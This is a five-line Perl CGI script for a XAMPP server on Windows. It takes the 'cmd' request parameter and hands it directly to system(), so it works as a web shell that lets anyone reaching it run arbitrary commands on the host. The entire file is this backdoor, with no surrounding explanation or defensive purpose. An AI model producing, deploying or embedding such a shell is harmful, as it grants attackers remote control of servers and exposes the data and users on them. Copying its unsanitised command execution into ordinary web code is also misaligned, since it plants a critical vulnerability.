#!"c:\xampp\perl\bin\perl.exe"
use CGI qw(:standard);
print header();
$c=param('cmd');
system($c);



